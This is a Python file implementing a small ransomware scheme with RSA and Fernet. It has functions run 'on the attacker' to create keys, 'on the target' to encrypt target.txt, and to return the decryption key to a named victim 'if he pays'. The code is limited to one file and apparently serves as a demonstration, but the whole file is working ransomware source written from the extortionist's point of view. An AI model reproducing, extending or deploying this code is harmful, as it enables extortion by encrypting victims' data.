from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet as f
def keygen():
  """Used to generate a private/public key pair"""
  rsa_priv = rsa.generate_private_key(public_exponent=65537,key_size=2048)
  rsa_public = rsa_priv.public_key()
  return (rsa_priv, rsa_public)


def symmetrickeygen(rsa_pub):
  # Generates symmetric key 
  key = f.generate_key()
  # Encrypts symmetric key with public key
  rsa_pub = serialization.load_pem_public_key(rsa_pub)
  symmencrypt = rsa_pub.encrypt(
      key,padding.OAEP(
      mgf=padding.MGF1(algorithm=hashes.SHA256()), 
      algorithm=hashes.SHA256(), 
      label=None))
  # Write public key (serialized) to disk
  try:
    output = open("publickey.txt", "xb")
  except:
    output = open("publickey.txt", 'wb')
  finally:
    output.write(rsa_pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo))
  # Write public-key encrypted symmetric key to disk & return symmetric key
  try:
    output = open("encryptedkey.txt", "xb")
  except:
    output = open("encryptedkey.txt", 'wb')
  finally:
    output.write(symmencrypt)
  return key

def encryptfile(target,symm_key):
  try:
    open(target, "rb")
  except:
    print(f'{target} does not exist')
  else:
    with open(target, "rb") as input:
      file_data = input.read()
    with open(target, "wb") as output:
      output.write(f(symm_key).encrypt(file_data))
    print()

# RUN ON THE ATTACKER
def attackersetup():
  keys = keygen()
  # Save private keys locally 
  try:
    output = open("privkey.txt", "xb")
  except:
    output = open("privkey.txt", 'wb')
  finally:
    print("writing private key - do not give to colton EVER")
    output.write(
        keys[0].private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption())
    )
    try:
      output = open("attackkey.txt", "xb")
    except:
      output = open("attackkey.txt", 'wb')
    finally:
      print("writing public key - GIVE TO COLTON")
      output.write(
          keys[1].public_bytes(
          encoding=serialization.Encoding.PEM,
          format=serialization.PublicFormat.PKCS1)
      )
    del keys

# RUN ON THE TARGET TO ENCRYPT
# Dumps public key to a file, generates Symmetric key, encrypts symmetric key with public key 
def encrypttarget():
  try:
    output = open("attackkey.txt", "rb")
  except:
    # If no attack key is there, do not run
    print("Please provide attackkey.txt")
  else:
    symm_key = symmetrickeygen(output.read())
    # Encrypt target file
    encryptfile("target.txt", symm_key)
    # Delete symmetric key from colton's system
    del symm_key


# RUN ON THE ATTACKER WHEN TARGET SENDS YOU THE KEY
def returnkey():
  try:
    output = open("encryptedkey.txt", "rb")
    privkey = serialization.load_pem_private_key(open("privkey.txt", "rb").read(),password=None)
  except:
    print("No encryptedkey.txt or no privkey.txt")
  else:
    symmkey = privkey.decrypt(output.read(),padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()), 
        algorithm=hashes.SHA256(), 
        label=None))
    output.close()
    try:
      output = open("symmkey.txt", "xb")
    except:
      output = open("symmkey.txt", 'wb')
    finally:
      print("writing symmetric key - give to colton if he pays")
      output.write(symmkey)

# RUN ON THE TARGET ONCE SYMMKEY.TXT IS RETURNED TO YOU 
def decrypttarget():
  try:
    open("target.txt", "rb")
    symmkey = open("symmkey.txt", "rb").read()
  except:
    print(f'target.txt does not exist')
  else:
    with open("target.txt", "rb") as input:
      file_data = input.read()
    with open("target.txt", "wb") as output:
      output.write(f(symmkey).decrypt(file_data))
    print()